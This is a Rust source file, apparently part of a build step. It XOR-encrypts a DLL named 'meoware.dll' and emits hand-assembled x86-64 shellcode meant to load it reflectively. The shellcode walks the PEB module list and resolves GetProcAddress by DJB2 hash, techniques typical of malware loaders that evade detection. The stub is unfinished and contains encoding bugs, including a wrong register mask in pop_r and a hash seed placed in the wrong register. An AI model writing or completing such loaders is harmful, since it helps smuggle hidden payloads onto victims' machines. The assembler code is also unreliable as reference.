use std::path::PathBuf;


pub fn find_meoware_dll() -> Option<PathBuf> {
    let out = std::env::var("OUT_DIR").ok()?;
    let out_path = PathBuf::from(&out);
    let mut search = out_path.as_path();
    for _ in 0..5 {
        search = search.parent()?;
        let candidate = search.join("meoware.dll");
        if candidate.exists() { return Some(candidate); }
    }
    None
}

fn djb2(name: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &c in name {
        if c == 0 { break; }
        h = h.wrapping_mul(33).wrapping_add(c as u32);
    }
    h
}


pub fn generate_reflective_shellcode(dll_bytes: &[u8], build_key: &[u8]) -> Vec<u8> {
    // Derive XOR key;
    let mut pk = [0u8; 16];
    for i in 0..16 {
        pk[i] = build_key[i % build_key.len()]
            .wrapping_add(build_key[(i + 7) % build_key.len()])
            .wrapping_mul(0x5A)
            .wrapping_add(i as u8 + 1);
        if pk[i] == 0 { pk[i] = 0x41; }
    }
    let enc: Vec<u8> = dll_bytes.iter().enumerate().map(|(i, b)| b ^ pk[i % 16]).collect();

    // Metadata header: [size:4][key:16][magic:4][pad:8] = 32 bytes
    let mut header = [0u8; 32];
    header[0..4].copy_from_slice(&(dll_bytes.len() as u32).to_le_bytes());
    header[4..20].copy_from_slice(&pk);
    header[20..24].copy_from_slice(&[0xFE, 0x11, 0x5C, 0x0D]);

    let h_gpa = djb2(b"GetProcAddress");

    // Build string table: null terminated ASCII strings after the stub
    let strings: Vec<(&str, Vec<u8>)> = vec![
        ("LoadLibraryA",   b"LoadLibraryA\0".to_vec()),
        ("VirtualAlloc",   b"VirtualAlloc\0".to_vec()),
        ("VirtualProtect", b"VirtualProtect\0".to_vec()),
    ];

    eprintln!("Hash: GetProcAddress=0x{:08X}", h_gpa);

    let (stub, str_offsets) = gen_stub(h_gpa, &strings);
    eprintln!("PIC stub: {} bytes, strings: {} bytes, DLL: {} bytes", stub.len(), str_offsets.1, enc.len());

    let mut sc = Vec::with_capacity(stub.len() + str_offsets.1 + 32 + enc.len());
    sc.extend_from_slice(&stub);
    // Sting table is already appended inside gen_stub
    // Append metadata + encrypted DLL
    sc.extend_from_slice(&header);
    sc.extend(&enc);
    sc
}

const RAX: u8 = 0;
const RCX: u8 = 1;
const RDX: u8 = 2;
const RBX: u8 = 3;
const RSP: u8 = 4;
const RBP: u8 = 5;
const RSI: u8 = 6;
const RDI: u8 = 7;
const R8 : u8 = 8;
const R9 : u8 = 9;
const R12: u8 = 12;
const R13: u8 = 13;
const R14: u8 = 14;
const R15: u8 = 15;

fn modrm(md: u8, reg: u8, rm: u8) -> u8 {
    (md << 6) | ((reg & 7) << 3) | (rm & 7)
}

// Emit REX prefix. w=64bit, r/b extend reg/rm fields
fn emit_rex(c: &mut Vec<u8>, w: bool, reg: u8, rm: u8) {
    let val = 0x40 
        | if w { 8 } else { 0 } 
        | ((reg >> 3) & 1) << 1
        | ((rm >> 3) & 1);
    if val != 0x40 || w { c.push(val) }
}

// Emit ModR/M + optional SIB + displacment for [base + disp]
fn emit_modrm_mem(c: &mut Vec<u8>, reg: u8, base: u8, disp: i32) {
    if disp == 0 && (base & 7) != 5 { // mod=00 (means no disp), except rbp/r13
        c.push(modrm(0, reg, base));
        if (base & 7) == 4 { c.push(0x24) } // SIP for rsp/r12
    } else if disp >= -128 && disp <= 127 {
        c.push(modrm(1, reg, base));
        if (base & 7) == 4 { c.push(0x24) }
        c.push(disp as i8 as u8);
    } else {
        c.push(modrm(2, reg, base));
        if (base & 7) == 4 { c.push(0x24) }
        c.extend_from_slice(&disp.to_le_bytes());
    }
}

// push r64
fn push_r(c: &mut Vec<u8>, reg: u8) {
    if reg >= 8 { c.push(0x41) }
    c.push(0x50 + (reg & 7));
}

// Pop r64  
fn pop_r(c: &mut Vec<u8>, reg: u8) {
    if reg >= 8 { c.push(0x41) }
    c.push(0x58 + (reg & 8));
}

// mov r64, r64
fn mov_rr(c: &mut Vec<u8>, dst: u8, src: u8) {
    emit_rex(c, true, src, dst);
    c.push(0x89);
    c.push(modrm(3, src, dst))
}

// mov r64, [base + disp]
fn mov_rm64(c: &mut Vec<u8>, dst: u8, base: u8, disp: i32) {
    emit_rex(c, true, dst, base);
    c.push(0x8B);
    emit_modrm_mem(c, dst, base, disp);
}

// mov r32, [base + disp] (32-bit load, zero extends to r64)
fn mov_rm32(c: &mut Vec<u8>, dst: u8, base: u8, disp: i32) {
    let need_rex = dst >= 8 || base >= 8;
    if need_rex { emit_rex(c, false, dst, base) }
    c.push(0x8B);
    emit_modrm_mem(c, dst, base, disp);
}


fn mov_mr64(c: &mut Vec<u8>, base: u8, disp: i32, src: u8) {
    let need_rex = src >= 8 || base >= 8;
    if need_rex { emit_rex(c, false, src, base) }
    c.push(0x89);
    emit_modrm_mem(c, src, base, disp);
}

fn mov_ri32(c: &mut Vec<u8>, dst: u8, imm: u32) {
    if dst >= 8 { c.push(0x41) } // REX.B
    c.push(0xB8 + (dst & 7));
    c.extend_from_slice(&imm.to_le_bytes());
}

fn movzx_rm8(c: &mut Vec<u8>, dst: u8, base: u8, disp: i32) {
    let need_rex = dst >= 8 || base >= 8;
    if need_rex { emit_rex(c, false, dst, base) }
    c.push(0x0F);
    c.push(0xB6);
    emit_modrm_mem(c, dst, base, disp);
}


fn movzx_rm16(c: &mut Vec<u8>, dst: u8, base: u8, disp: i32) {
    let need_rex = dst >= 8 || base >= 8;
    if need_rex { emit_rex(c, false, dst, base) }
    c.push(0x0F);
    c.push(0xB7);
    emit_modrm_mem(c, dst, base, disp);
}

fn inc_r(c: &mut Vec<u8>, reg: u8) {
    emit_rex(c, true, 0, reg);
    c.push(0xFF);
    c.push(modrm(3, 0, reg));
}

fn dec_r32(c: &mut Vec<u8>, reg: u8) {
    if reg >= 8 { emit_rex(c, false, 1, reg) }
    c.push(0xFF);
    c.push(modrm(3, 1, reg));
}

fn imul_rri8(c: &mut Vec<u8>, dst: u8, src: u8, imm: i8) {
    let need_rex = dst >= 8 || src >= 8;
    if need_rex { emit_rex(c, false, dst, src) }
    c.push(0x6B);
    c.push(modrm(3, dst, src));
    c.push(imm as u8);
}

fn add_rr32(c: &mut Vec<u8>, dst: u8, src: u8) {
    let need_rex = dst >= 8 || src >= 8;
    if need_rex { emit_rex(c, false, dst, src) }
    c.push(0x01);
    c.push(modrm(3, src, dst))
}

fn add_rr(c: &mut Vec<u8>, dst: u8, src: u8) {
    emit_rex(c, true, src, dst);
    c.push(0x01);
    c.push(modrm(3, src, dst));
}

fn shl_ri8(c: &mut Vec<u8>, reg: u8, imm: u8) {
    emit_rex(c, true, 4, reg); // /4 = shl
    c.push(0xC1);
    c.push(modrm(3, 4, reg));
    c.push(imm);
}

fn test_rr(c: &mut Vec<u8>, a: u8, b: u8) {
    emit_rex(c, true, b, a);
    c.push(0x85);
    c.push(modrm(3, b, a));
}

fn test_rr32(c: &mut Vec<u8>, a: u8, b: u8) {
    let need_rex = a >= 8 || b >= 8;
    if need_rex { emit_rex(c, false, b, a) }
    c.push(0x85);
    c.push(modrm(3, b, a));
}

fn test_al(c: &mut Vec<u8>) {
    c.push(0x84);
    c.push(0xC0);
}


fn cmp_ri32(c: &mut Vec<u8>, reg: u8, imm: u32) {
    let need_rex = reg >= 8;
    if need_rex { emit_rex(c, false, 7, reg) }
    c.push(0x81);
    c.push(modrm(3, 7, reg));
    c.extend_from_slice(&imm.to_le_bytes());
}

// sub r64, imm32
fn sub_ri(c: &mut Vec<u8>, dst: u8, imm: i32) {
    emit_rex(c, true, 5, dst); // /5 = sub
    c.push(0x81);
    c.push(modrm(3, 5, dst));
    c.extend_from_slice(&imm.to_le_bytes());
}

// ret
fn ret(c: &mut Vec<u8>) {
    c.push(0xC3);
}

// Jmp back to target address
fn jmp_back(c: &mut Vec<u8>, target: usize) {
    let offset8 = (target as i64) - (c.len() as i64 + 2);
    if offset8 >= -128 && offset8 < 128 {
        c.push(0xEB);
        c.push(offset8 as i8 as u8);
    } else {
        let offset32 = (target as i32) - (c.len() as i32 + 5);
        c.push(0xE9);
        c.extend_from_slice(&offset32.to_le_bytes());
    }
}

fn jcc32(c: &mut Vec<u8>, cc: u8) -> usize {
    let pos = c.len();
    c.push(0x0F);
    c.push(cc);
    c.extend_from_slice(&[0, 0, 0, 0]); // placeholder
    pos
}

fn jcc8(c: &mut Vec<u8>, cc: u8) -> usize {
    let pos = c.len();
    c.push(cc);
    c.push(0); // placeholder
    pos
}

// Patch a rel8 jump target currnet position
fn patch8(c: &mut Vec<u8>, pos: usize) {
    let target = c.len();
    let offset = (target as i32) - (pos as i32 + 2); // 1 oppcode + 1 disp
    assert!(offset >= -128 && offset < 128, "rel8 out of range: {}", offset);
    c[pos + 1] = offset as i8 as u8;
}

/**
 * PIC Stub Generator
 * */
fn gen_stub(h_gpa: u32, strings: &[(&str, Vec<u8>)]) -> (Vec<u8>, (Vec<usize>, usize)) {
    let mut c: Vec<u8> = Vec::with_capacity(2048);

    // PROLOGUE
    c.extend_from_slice(&[0xE8, 0, 0, 0, 0]);           // call $+5
    pop_r(&mut c, RBX);                                 // pop rbx = address of this insn (byte 5)

    push_r(&mut c, RBP);
    mov_rr(&mut c, RBP, RSP);
    sub_ri(&mut c, RSP, 0x100); // 256 butes of locals
    push_r(&mut c, R12);
    push_r(&mut c, R13);
    push_r(&mut c, R14);
    push_r(&mut c, R15);
    push_r(&mut c, RSI);
    push_r(&mut c, RDI);

    // gs:[0x60] -> PEB -> Ldr -> InMemoryOrderModuleList
    c.extend_from_slice(
        &[0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0, 0, 0]  // mov rax, gs[0x60]
    );    
    mov_rm64(&mut c, RAX, RAX, 0x18);                   // [PEB+0x18] = ldr 
    mov_rm64(&mut c, RSI, RAX, 0x20);                   // rsi = InMemoryOrderModuleList.Flink (which is the first entry)
    mov_mr64(&mut c, RBP, -0x48, RSI);                  // save the list head for the loop termination         

    // Module loop to try each loaded DLL
    let module_loop = c.len();

    // Get DllBase for this entry
    mov_rm64(&mut c, R12, RSI, 0x20);                   // r12 = DllBase
    test_rr(&mut c, R12, R12);
    let jz_skip_module = jcc32(&mut c, 0x84);           // skip if DllBase is NULL

    // Check if this module has valid MZ header
    movzx_rm16(&mut c, RAX, R12, 0);                    // ax = [base+0] (should be 0x5A4D)
    cmp_ri32(&mut c, RAX, 0x5A4D);
    let jne_skip_module = jcc32(&mut c, 0x85);          // skip if not MZ

    // Parse PE: e_lfanew -> NT header -> export dir
    mov_rm32(&mut c, RAX, R12, 0x3C);                   // eax = e_lfanew
    add_rr(&mut c, RAX, R12);                           // rax = Nt headers 
    mov_rm32(&mut c, RDX, RAX, 0x88);                   // edx = export dir RVA
    test_rr32(&mut c, RDX, RDX);                        
    let jz_skip_module2 = jcc32(&mut c, 0x84);          // Skip if no export dir

    add_rr(&mut c, RDX, R12);                           // rdx = export dir VA
    mov_mr64(&mut c, RBP, 0x040, RDX);                  // save export dir

    // Read export dir fields
    mov_rm32(&mut c, RCX, RDX, 0x18);                   // ecx = NumberOfNames
    test_rr32(&mut c, RCX, RCX);
    let js_skip_module3 = jcc32(&mut c, 0x84);          // skip if no names

    mov_rm32(&mut c, RDI, RDX, 0x20);                   // edi = AddressOfNames RVA
    add_rr(&mut c, RDI, R12);                           // rdi = AddressOfNames VA
    mov_mr64(&mut c, RBP, -0x60, RDI);                  // save AddressOfNames VA

    // hash each name and compare it to GetProcAddress hash
    let name_loop = c.len();
    dec_r32(&mut c, RCX);

    //  name_ptr = moduel_base + AddressOfNames[eax]
    mov_rr(&mut c, RAX, RCX);                           // rax = index
    shl_ri8(&mut c, RAX, 2);                            // rax = index * 4
    add_rr(&mut c, RAX, RDI);                           // rax = &AddressOfNames[index]
    mov_rm32(&mut c, RAX, RAX, 0);                      // eax = AddressOfNames[index] RVA
    add_rr(&mut c, RAX, R12);                           // rax = name string VA

    // Hash export names iwht DJB2
    push_r(&mut c, RCX);                                // save loop counter
    push_r(&mut c, RDI);                                // save names array pointer
    push_r(&mut c, RSI);                                // save module entry pointer
    mov_rr(&mut c, R14, RAX);                           // r14 = name string (temp)
    mov_ri32(&mut c, RCX, 5381);                        // edx = DJB2 seed

    let hash_loop = c.len();
    movzx_rm8(&mut c, RAX, R14, 0);                     // eax = *14 
    test_al(&mut c);                                    // test al, al
    let js_hash_done = jcc8(&mut c, 0x74);              // jz hash_done
    imul_rri8(&mut c, RDX, RDX, 33);                    // edx *= 33
    add_rr32(&mut c, RDX, RAX);                         // edx += char
    inc_r(&mut c, R14);                                 // r14++
    jmp_back(&mut c, hash_loop);
    patch8(&mut c, js_hash_done);

    // TODO: Compare hash to GetProcAddress hash
    unimplemented!()        
}